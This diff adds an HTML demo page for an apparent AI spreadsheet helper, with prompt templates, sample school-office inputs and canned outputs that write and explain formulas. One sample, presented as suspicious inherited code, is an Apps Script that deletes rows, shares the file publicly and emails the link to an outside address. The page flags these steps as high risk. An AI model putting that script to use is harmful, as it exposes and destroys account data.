@@ -1,0 +1,348 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Spreadsheet Formulas</title>
+<style>
+  :root {
+    --bg: #fcfcfb; --ink: #0b0b0b; --muted: #52514e; --line: #d9d8d3;
+    --card: #ffffff; --accent: #1c5cab; --accent-ink: #ffffff; --soft: #eef4fc;
+    --no-bg: #fbe4e2; --no-ink: #8f1c12; --q-bg: #fdf1d6; --q-ink: #6e4400; --low-bg: #ecebe6;
+    --hl: #fff0a8;
+  }
+  * { box-sizing: border-box; }
+  [hidden] { display: none !important; }
+  body { margin: 0; background: var(--bg); color: var(--ink);
+    font: 20px/1.5 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+  main { max-width: 1500px; margin: 0 auto; padding: 24px 16px 40px; }
+  h1 { font-size: 2.1rem; margin: 0; line-height: 1.2; }
+  .sub { color: var(--muted); margin: 6px 0 20px; font-size: 1.15rem; }
+  .controls { display: flex; flex-wrap: wrap; gap: 12px 22px; align-items: center; margin-bottom: 18px; }
+  .presets { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+  .presets > span { color: var(--muted); font-weight: 600; margin-right: 4px; }
+  button { font: inherit; font-weight: 600; padding: 10px 22px; min-height: 52px; cursor: pointer;
+    background: var(--card); color: var(--ink); border: 2px solid var(--accent); border-radius: 10px; }
+  button[aria-pressed="true"] { background: var(--accent); color: var(--accent-ink); }
+  #toggle-prompt { border-color: var(--line); }
+  #toggle-prompt[aria-pressed="true"] { border-color: var(--accent); }
+  .mono { font-family: ui-monospace, Menlo, Consolas, monospace; }
+  .prompt { background: #f3f2ee; border: 1px solid var(--line); border-radius: 10px; padding: 14px 18px; margin: 0 0 18px;
+    white-space: pre-wrap; overflow-wrap: anywhere; font: .95rem/1.5 ui-monospace, Menlo, Consolas, monospace; }
+  .io { display: grid; grid-template-columns: 2fr 3fr; gap: 16px; align-items: start; }
+  .panel { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 16px 20px; min-width: 0; }
+  .panel.in { background: #f3f2ee; }
+  .panel h2 { font-size: 1rem; text-transform: uppercase; letter-spacing: .06em; color: var(--muted); margin: 0 0 8px; }
+  .input { margin: 0; white-space: pre-wrap; overflow-wrap: anywhere; font: inherit; font-size: 1.05rem; }
+  .input.mono { font: .9rem/1.5 ui-monospace, Menlo, Consolas, monospace; }
+  .drafting { color: var(--muted); font-style: italic; }
+  .formula { background: var(--soft); border: 2px solid var(--accent); border-radius: 8px; padding: 10px 14px; margin: 0 0 6px;
+    font: 1.05rem/1.5 ui-monospace, Menlo, Consolas, monospace; white-space: pre-wrap; overflow-wrap: anywhere; font-weight: 600; }
+  .where { margin: 0 0 12px; }
+  .out h3 { font-size: 1.15rem; margin: 16px 0 6px; }
+  .summary { font-size: 1.1rem; font-weight: 600; margin: 0 0 8px; }
+  .tw { overflow-x: auto; margin: 0 0 12px; }
+  .cap { font-weight: 700; margin: 0 0 4px; font-size: .95rem; }
+  table { width: 100%; border-collapse: collapse; }
+  th { text-align: left; font-size: .9rem; color: var(--muted); border-bottom: 2px solid var(--line); padding: 4px 8px; }
+  td { border-bottom: 1px solid var(--line); padding: 6px 8px; vertical-align: top; }
+  .sample td { font-size: .95rem; }
+  tr.hl td { background: var(--hl); }
+  td.hlc { background: var(--soft); font-weight: 700; }
+  td.code { font: .85rem/1.5 ui-monospace, Menlo, Consolas, monospace; overflow-wrap: anywhere; width: 45%; }
+  ul.list { margin: 0; padding-left: 1.2em; }
+  ul.list li { margin-bottom: 6px; }
+  ul.risks { list-style: none; margin: 0; padding: 0; }
+  ul.risks li { display: flex; gap: 10px; align-items: flex-start; padding: 6px 0; border-bottom: 1px solid var(--line); }
+  .pill { border-radius: 999px; padding: 2px 12px; font-weight: 700; font-size: .9rem; white-space: nowrap; }
+  .high { background: var(--no-bg); color: var(--no-ink); }
+  .medium { background: var(--q-bg); color: var(--q-ink); }
+  .low { background: var(--low-bg); color: var(--ink); }
+  .note { color: var(--muted); font-size: .95rem; }
+  footer { color: var(--muted); font-size: 1rem; margin-top: 20px; }
+  @media (max-width: 900px) { .io { grid-template-columns: 1fr; } td.code { width: auto; } }
+</style>
+</head>
+<body>
+<main>
+  <h1>Spreadsheet formulas</h1>
+  <p class="sub">Describe the result you want and get the formula. Or paste an inherited formula or script and get it explained, risks included, before anyone trusts it.</p>
+
+  <div class="controls">
+    <div class="presets" role="group" aria-label="Mode">
+      <span>Mode</span>
+      <button data-mode="write" aria-pressed="true">Words → formula</button>
+      <button data-mode="explain" aria-pressed="false">Formula or script → plain English</button>
+    </div>
+  </div>
+  <div class="controls">
+    <div class="presets" role="group" aria-label="Example" id="presets"><span>Example</span></div>
+    <button id="toggle-prompt" aria-pressed="false">Show the prompt</button>
+  </div>
+  <pre class="prompt" id="prompt" hidden></pre>
+
+  <div class="io">
+    <section class="panel in">
+      <h2 id="in-label">What you paste in</h2>
+      <pre class="input" id="input"></pre>
+    </section>
+    <section class="panel">
+      <h2>What comes back</h2>
+      <div id="out" class="out"></div>
+    </section>
+  </div>
+
+  <footer>
+    Test every formula on a copy of the sheet, and have IT review any script before it runs. All sample data is made up.
+    Every output was generated ahead of time so this page works with no internet.
+  </footer>
+</main>
+
+<script>
+const PROMPTS = {
+  write: `Write a spreadsheet formula that works in both Google Sheets and Excel for the result I describe below.
+
+Format: the formula on its own line; which cell to put it in and how to fill it down; a piece-by-piece explanation in plain English; and a small sample table (6–8 rows of made-up data) showing what the formula returns, including at least one edge case that almost qualifies.
+
+Voice: plain and friendly, for a school office staff member who is comfortable in spreadsheets but doesn't write formulas.
+
+Context: my sheet layout is described below; use only those columns. List every assumption you made about the data (blank cells, dates stored as text, spelling) and how to check it.
+
+What I want:
+[describe your columns and the result you want]`,
+
+  explain: `Explain the spreadsheet formula or Apps Script below, line by line, in plain English.
+
+Format: a one-sentence summary of what it does; then each line or piece of the code next to what it does; then a list headed "Risky or surprising," rated High / Medium / Low, covering anything that deletes or changes data, shares files, sends email, contacts an outside address, runs on a schedule, or can return a wrong answer without showing an error. Finish with a safer version if one is short, or with what to check before anyone runs it.
+
+Voice: plain and careful, for a school administrator who didn't write this and has to decide whether to keep using it.
+
+Context: credit the parts that are done correctly so the reader knows what not to change. Do not run the code or assume what it was meant to do beyond what it says.
+
+Code:
+[paste the formula or script here]`
+};
+
+const INPUTS = [
+  { id: "aging", mode: "write", label: "Devices past 5 years", text:
+"My Inventory tab has the asset tag in column A, building in B, device type in C, and purchase date in D.\n\nOn my Summary tab, building names are in column F starting at F2. In column G, I want the number of devices in each building that are past our 5-year replacement cycle." },
+
+  { id: "inactive", mode: "write", label: "Flag inactive accounts", text:
+"Accounts tab: account ID in A, last sign-in date in B, on leave (Y or N) in C.\n\nIn column D, flag accounts with no sign-in for 90 days or more so we can review them, but skip anyone on leave. Some accounts have never signed in, so B is blank. Flag those too." },
+
+  { id: "billing", mode: "explain", label: "Inherited repair-billing formula", text:
+`Repair log, column D. Inherited, no notes.
+A = part code · B = quantity · C = repair type
+
+=IF(A2="","",ROUND(IFERROR(VLOOKUP(A2,Parts!$A:$C,3)*B2,0)*IF(C2="Warranty",0,IF(C2="Accidental",0.5,1)),2))` },
+
+  { id: "script", mode: "explain", label: "Mystery Apps Script", text:
+`// Found in the device roster's script editor. Author unknown.
+function cleanUpRoster() {
+  var ss = SpreadsheetApp.getActiveSpreadsheet();
+  var sh = ss.getSheetByName("Accounts");
+  var data = sh.getDataRange().getValues();
+  for (var i = data.length - 1; i > 0; i--) {
+    if (data[i][3] == "inactive") {
+      sh.deleteRow(i + 1);
+    }
+  }
+  DriveApp.getFileById(ss.getId())
+    .setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
+  MailApp.sendEmail("techhelper.home@example.net", "Roster cleaned", ss.getUrl());
+}` }
+];
+
+const CANNED = {
+  write: {
+    aging: {
+      formula: '=COUNTIFS(Inventory!$B:$B, F2, Inventory!$D:$D, "<"&EDATE(TODAY(), -60))',
+      where: "Put it in G2 on the Summary tab, then drag it down next to each building.",
+      parts: [
+        ["COUNTIFS( … )", "Counts the rows that pass every test inside."],
+        ["Inventory!$B:$B, F2", "Test 1: the building matches the name in F2."],
+        ["EDATE(TODAY(), -60)", "The date exactly 60 months (5 years) before today."],
+        ['Inventory!$D:$D, "<"&EDATE(…)', "Test 2: the purchase date is earlier than that date."],
+        ["The $ signs", "Keep the Inventory columns fixed when you drag the formula down."]
+      ],
+      tables: [
+        { caption: "Inventory tab (highlighted rows are counted)", headers: ["Asset tag", "Building", "Type", "Purchased"], hlRows: [0, 2, 3, 6, 7], rows: [
+          ["INV-1001", "Lincoln MS", "Chromebook", "8/14/2019"],
+          ["INV-1002", "Lincoln MS", "Laptop", "7/1/2022"],
+          ["INV-1003", "Central HS", "Projector", "3/20/2018"],
+          ["INV-1004", "Central HS", "Chromebook", "9/30/2021"],
+          ["INV-1005", "Central HS", "Laptop", "1/10/2023"],
+          ["INV-1006", "Oak Elementary", "Chromebook", "10/15/2021"],
+          ["INV-1007", "Oak Elementary", "Printer", "11/2/2017"],
+          ["INV-1008", "Lincoln MS", "Projector", "6/5/2020"]
+        ]},
+        { caption: "Summary tab", headers: ["F: Building", "G: Past 5 years"], hlCol: 1, rows: [
+          ["Lincoln MS", "2"], ["Central HS", "2"], ["Oak Elementary", "1"]
+        ]}
+      ],
+      notes: [
+        "Shown as of Sat., Oct. 3, 2026: anything bought before Oct. 3, 2021 counts. The formula uses today's date, so the counts update on their own.",
+        "Edge case: INV-1004 (Sept. 30, 2021) just makes the cut; INV-1006 (Oct. 15, 2021) doesn't yet.",
+        'Assumption: purchase dates are real dates, not text. Devices with a blank date aren\'t counted. Find them with =COUNTIFS(Inventory!$B:$B, F2, Inventory!$D:$D, "").'
+      ]
+    },
+    inactive: {
+      formula: '=IF(C2="Y", "", IF(OR(B2="", TODAY()-B2>=90), "Review", ""))',
+      where: "Put it in D2, then fill down. Filter column D for “Review.”",
+      parts: [
+        ['IF(C2="Y", "", … )', "On leave? Leave D blank and skip the rest."],
+        ['B2=""', "Never signed in: flag it."],
+        ["TODAY()-B2>=90", "90 or more days since the last sign-in: flag it."],
+        ["OR( … )", "Either one is enough to flag."],
+        ['"Review"', "Marks the account for a person to look at. Nothing gets disabled."]
+      ],
+      tables: [
+        { caption: "Accounts tab", headers: ["A: Account", "B: Last sign-in", "C: On leave", "D: Flag"], hlCol: 3, rows: [
+          ["staff-0142", "9/28/2026", "N", ""],
+          ["staff-0157", "5/11/2026", "N", "Review"],
+          ["staff-0163", "", "N", "Review"],
+          ["staff-0171", "3/2/2026", "Y", ""],
+          ["staff-0188", "7/6/2026", "N", ""],
+          ["staff-0194", "6/30/2026", "N", "Review"]
+        ]}
+      ],
+      notes: [
+        "Shown as of Sat., Oct. 3, 2026.",
+        "Edge case: staff-0188 is at 89 days, so it isn't flagged yet. It will be tomorrow.",
+        "staff-0171 hasn't signed in since March but is on leave, so it's skipped.",
+        "Assumption: sign-in dates are real dates. If your export brings them in as text, convert them first or the formula will show an error."
+      ]
+    }
+  },
+  explain: {
+    billing: {
+      summary: "Bills a school for a repair: part price × quantity, discounted by repair type.",
+      lines: [
+        ['IF(A2="", "", … )', "If there's no part code in A2, leave the cell blank."],
+        ["VLOOKUP(A2, Parts!$A:$C, 3)", "Finds the part code on the Parts tab and takes the price from its 3rd column."],
+        ["… * B2", "Multiplies the price by the quantity."],
+        ["IFERROR( … , 0)", "If anything above fails, uses 0 instead of showing an error."],
+        ['IF(C2="Warranty", 0, IF(C2="Accidental", 0.5, 1))', "Warranty repairs bill $0. Accidental damage bills half. Anything else bills full price."],
+        ["ROUND( … , 2)", "Rounds to the cent."]
+      ],
+      risks: [
+        ["high", "VLOOKUP has no 4th argument, so it does an approximate match. If the Parts tab isn't sorted by code, or a code is missing, it can return a different part's price with no error."],
+        ["high", "IFERROR(…, 0) turns any failure into $0.00. A mistyped part code looks like a free repair instead of a problem."],
+        ["medium", "The repair type must match exactly. “Warranty ” with a trailing space, or “Under warranty,” bills at full price."],
+        ["low", "The 50% rate is typed into every cell. If the policy changes, every copy of the formula has to change."]
+      ],
+      safer: '=IF(A2="","",IFERROR(ROUND(VLOOKUP(A2,Parts!$A:$C,3,FALSE)*B2*IF(TRIM(C2)="Warranty",0,IF(TRIM(C2)="Accidental",0.5,1)),2),"CHECK PART CODE"))',
+      saferNote: "Exact match only, extra spaces ignored, and a bad part code shows CHECK PART CODE instead of $0.00. The blank-row check and the rounding were already right; they stay.",
+      before: []
+    },
+    script: {
+      summary: "Deletes every row marked “inactive” on the Accounts tab, makes the file viewable by anyone with the link, then emails that link to an outside address.",
+      lines: [
+        ["function cleanUpRoster() {", "Starts a script named cleanUpRoster."],
+        ["var ss = SpreadsheetApp.getActiveSpreadsheet();", "Grabs this spreadsheet."],
+        ['var sh = ss.getSheetByName("Accounts");', "Opens the Accounts tab."],
+        ["var data = sh.getDataRange().getValues();", "Reads every filled cell on that tab."],
+        ["for (var i = data.length - 1; i > 0; i--) {", "Walks the rows from the bottom up, skipping the header. Bottom-up is correct: deleting a row won't shift the rows still to check."],
+        ['if (data[i][3] == "inactive") {', "Checks column D for the exact word “inactive.”"],
+        ["sh.deleteRow(i + 1);", "Deletes that whole row."],
+        ["DriveApp.getFileById(ss.getId()) .setSharing(ANYONE_WITH_LINK, VIEW);", "Changes the file's sharing so anyone with the link can view it."],
+        ['MailApp.sendEmail("techhelper.home@example.net", …, ss.getUrl());', "Emails the file's link to an address outside the district."]
+      ],
+      risks: [
+        ["high", "Makes the whole spreadsheet viewable by anyone who has the link, every time it runs. Account data could be exposed."],
+        ["high", "Sends that link to techhelper.home@example.net, an outside address. Together with the sharing change, whoever reads that inbox can open the file."],
+        ["high", "Deletes rows permanently. The script keeps no copy; recovery depends on version history."],
+        ["medium", "Matches only lowercase “inactive” exactly. “Inactive” or “inactive ” is skipped, so the cleanup is quietly incomplete."],
+        ["medium", "The code can't show whether it runs on a schedule. Check the Triggers page (clock icon) in the Apps Script editor."]
+      ],
+      safer: "",
+      saferNote: "",
+      before: [
+        "Check the Triggers page and pause any schedule until this is reviewed.",
+        "Find out who added the sharing and email lines, and why. Remove them unless there's a clear reason.",
+        "Make a copy of the sheet before any test run."
+      ]
+    }
+  }
+};
+
+// AI boundary. Canned today; to go live, replace this body with a call to a model
+// (send PROMPTS[task] + the input text, return the model's text). Nothing else changes.
+async function respond(task, input) {
+  await new Promise(r => setTimeout(r, 700)); // feels like generation; remove when live
+  return CANNED[task][input.id];
+}
+
+const esc = s => s.replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+const $ = id => document.getElementById(id);
+const pairs = (rows, codeHead) => `<div class="tw"><table><thead><tr><th>${codeHead}</th><th>What it does</th></tr></thead><tbody>` +
+  rows.map(([c, m]) => `<tr><td class="code">${esc(c)}</td><td>${esc(m)}</td></tr>`).join("") + "</tbody></table></div>";
+
+function sample(t) {
+  return `<div class="tw"><p class="cap">${esc(t.caption)}</p><table class="sample"><thead><tr>${t.headers.map(h => `<th>${esc(h)}</th>`).join("")}</tr></thead><tbody>` +
+    t.rows.map((r, i) => `<tr class="${(t.hlRows || []).includes(i) ? "hl" : ""}">` +
+      r.map((c, j) => `<td class="${j === t.hlCol ? "hlc" : ""}">${esc(c)}</td>`).join("") + "</tr>").join("") + "</tbody></table></div>";
+}
+
+function renderWrite(res) {
+  return `<pre class="formula">${esc(res.formula)}</pre><p class="where">${esc(res.where)}</p>
+    <h3>Piece by piece</h3>${pairs(res.parts, "Piece")}
+    <h3>Sample: the formula at work</h3>${res.tables.map(sample).join("")}
+    <ul class="list note">${res.notes.map(n => `<li>${esc(n)}</li>`).join("")}</ul>`;
+}
+
+function renderExplain(res) {
+  let html = `<p class="summary">${esc(res.summary)}</p>
+    <h3>Line by line</h3>${pairs(res.lines, "Code")}
+    <h3>Risky or surprising</h3><ul class="risks">` +
+    res.risks.map(([lvl, t]) => `<li><span class="pill ${lvl}">${lvl[0].toUpperCase() + lvl.slice(1)}</span><span>${esc(t)}</span></li>`).join("") + "</ul>";
+  if (res.safer) html += `<h3>Safer version</h3><pre class="formula">${esc(res.safer)}</pre><p class="note">${esc(res.saferNote)}</p>`;
+  if (res.before.length) html += `<h3>Before anyone runs it</h3><ul class="list">${res.before.map(b => `<li>${esc(b)}</li>`).join("")}</ul>`;
+  return html;
+}
+
+let current = 0, mode = "write";
+async function select(input) {
+  const run = ++current;
+  document.querySelectorAll("[data-id]").forEach(b => b.setAttribute("aria-pressed", b.dataset.id === input.id));
+  const inp = $("input");
+  inp.textContent = input.text;
+  inp.className = input.mode === "explain" ? "input mono" : "input";
+  $("in-label").textContent = input.mode === "explain" ? "What you paste in: the inherited code" : "What you paste in: the result you want, in words";
+  $("out").innerHTML = '<p class="drafting">Drafting…</p>';
+  const res = await respond(input.mode, input);
+  if (run !== current) return;
+  $("out").innerHTML = input.mode === "write" ? renderWrite(res) : renderExplain(res);
+}
+
+function setMode(m) {
+  mode = m;
+  document.querySelectorAll("[data-mode]").forEach(b => b.setAttribute("aria-pressed", b.dataset.mode === mode));
+  document.querySelectorAll("[data-id]").forEach(b => { b.hidden = b.dataset.for !== mode; });
+  $("prompt").textContent = PROMPTS[mode];
+  select(INPUTS.find(i => i.mode === mode));
+}
+
+INPUTS.forEach(input => {
+  const b = document.createElement("button");
+  b.textContent = input.label;
+  b.dataset.id = input.id;
+  b.dataset.for = input.mode;
+  b.setAttribute("aria-pressed", "false");
+  b.addEventListener("click", () => select(input));
+  $("presets").appendChild(b);
+});
+document.querySelectorAll("[data-mode]").forEach(b => b.addEventListener("click", () => setMode(b.dataset.mode)));
+
+const toggle = $("toggle-prompt");
+toggle.addEventListener("click", () => {
+  const box = $("prompt");
+  box.hidden = !box.hidden;
+  toggle.setAttribute("aria-pressed", !box.hidden);
+  toggle.textContent = box.hidden ? "Show the prompt" : "Hide the prompt";
+});
+
+setMode("write");
+</script>
+</body>
+</html>
